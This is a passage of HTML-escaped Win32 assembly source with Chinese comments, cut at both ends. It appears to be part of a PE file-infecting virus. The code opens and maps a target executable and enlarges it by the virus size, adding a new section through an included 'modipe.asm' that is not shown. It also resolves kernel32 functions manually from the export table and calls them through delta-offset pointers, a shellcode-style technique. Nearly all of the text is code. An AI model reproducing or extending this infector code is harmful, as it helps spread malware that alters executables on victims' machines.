eax&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;得到文件大小 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+aGetFileSize] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; inc&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; je&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; __sclosefile &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dec&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+fsize],eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xchg&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,ecx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,1000h&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;文件大小增加...4096 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; pop&amp;nbsp;&amp;nbsp;&amp;nbsp; eax&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xor&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx,ebx&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;创建映射文件 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;文件大小等于原大小+Vsize &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; PAGE_READWRITE &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+aCreateFileMapping] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; test&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; je&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; __sclosefile &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+hMap],eax&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;创建成功否? &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xor&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx,ebx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; FILE_MAP_WRITE&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+aMapViewOfFile] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; test&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; je&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; __sclosemap&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ; 映射文件,是否成功? &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+pMem],eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;-------------------------------------------- &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ; the following is modifying part,add new section &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;-------------------------------------------- &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; include modipe.asm &lt;/P&gt;
&lt;P&gt;__sunview: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+pMem] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+aUnmapViewOfFile] &lt;BR&gt;__sclosemap: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+hMap] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+aCloseHandle] &lt;BR&gt;__sclosefile: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+hfile] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+aCloseHandle] &lt;BR&gt;__Err:: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ret &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;;----------------------------------------- &lt;BR&gt;__xit:&amp;nbsp;&amp;nbsp; &lt;/P&gt;
&lt;P&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; 0 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+aExitProcess] &lt;BR&gt;vEnd:&amp;nbsp;&amp;nbsp; &lt;BR&gt;;----------------------------------------- &lt;/P&gt;
&lt;P&gt;END&amp;nbsp;&amp;nbsp;&amp;nbsp; __Start &lt;BR&gt;;;============================================== &lt;BR&gt;;;s_api.asm &lt;BR&gt;;;手动查找api部分 &lt;/P&gt;
&lt;P&gt;K32_api_retrieve&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; proc&amp;nbsp;&amp;nbsp;&amp;nbsp; Base:DWORD ,sApi:DWORD &lt;/P&gt;
&lt;P&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; edx&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;保存edx&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xor&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,eax&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;此时esi=sApi &lt;BR&gt;Next_Api:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;edi=AddressOfNames &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; esi,sApi &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xor&amp;nbsp;&amp;nbsp;&amp;nbsp; edx,edx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dec&amp;nbsp;&amp;nbsp;&amp;nbsp; edx &lt;BR&gt;Match_Api_name: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; movzx&amp;nbsp; ebx,byte&amp;nbsp; ptr [esi] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; inc&amp;nbsp;&amp;nbsp;&amp;nbsp; esi &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cmp&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx,0 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; je&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; foundit &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; inc&amp;nbsp;&amp;nbsp;&amp;nbsp; edx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,[edi+eax*4]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;AddressOfNames的指针,递增 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,Base&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;注意是RVA,一定要加Base值 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cmp&amp;nbsp;&amp;nbsp;&amp;nbsp; bl,byte&amp;nbsp; ptr [eax+edx]&amp;nbsp; ;逐字符比较&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; pop&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; je&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Match_Api_name&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;继续搜寻 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; inc&amp;nbsp;&amp;nbsp;&amp;nbsp; eax&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;不匹配,下一个api &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; loop&amp;nbsp;&amp;nbsp;&amp;nbsp; Next_Api &lt;BR&gt;no_exist: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; pop&amp;nbsp;&amp;nbsp;&amp;nbsp; edx&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;若全部搜完,即未存在 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xor&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ret &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;foundit: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; pop&amp;nbsp;&amp;nbsp;&amp;nbsp; edx&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;edx=AddressOfNameOrdinals &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;*2得到AddressOfNameOrdinals的指针 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; movzx&amp;nbsp; eax,word&amp;nbsp; ptr [edx+eax*2] ;eax返回指向AddressOfFunctions的指针 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ret &lt;BR&gt;K32_api_retrieve&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; endp &lt;BR&gt;;----------------------------------------- &lt;/P&gt;
&lt;P&gt;GetApiA&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; proc&amp;nbsp;&amp;nbsp;&amp;nbsp; Base:DWORD,sApi:DWORD &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; local&amp;nbsp;&amp;nbsp;&amp;nbsp; ADDRofFun:DWORD &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; pushad &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; esi,Base &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,esi &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx,eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; edx,eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; edi,eax&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;all is Base! &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,[ecx+3ch]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;现在esi=off PE_HEADER&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; esi,[ecx+78h]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;得到esi=IMAGE_EXPORT_DIRECTORY入口 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,[esi+1ch]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;eax=AddressOfFunctions的地址 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; ADDRofFun,eax&lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; ecx,[esi+18h]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;ecx=NumberOfNames &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; edx,[esi+24h]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;edx=AddressOfNameOrdinals &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; edi,[esi+20h]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;esi=AddressOfNames &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; invoke&amp;nbsp;&amp;nbsp;&amp;nbsp; K32_api_retrieve,Base,sApi &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx,ADDRofFun &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,[ebx+eax*4]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;要*4才得到偏移 &lt;/P&gt;
&lt;P&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,Base&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;加上Base! &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; [esp+7*4],eax&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;eax返回api地址 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; popad &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ret &lt;BR&gt;GetApiA&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; endp &lt;/P&gt;
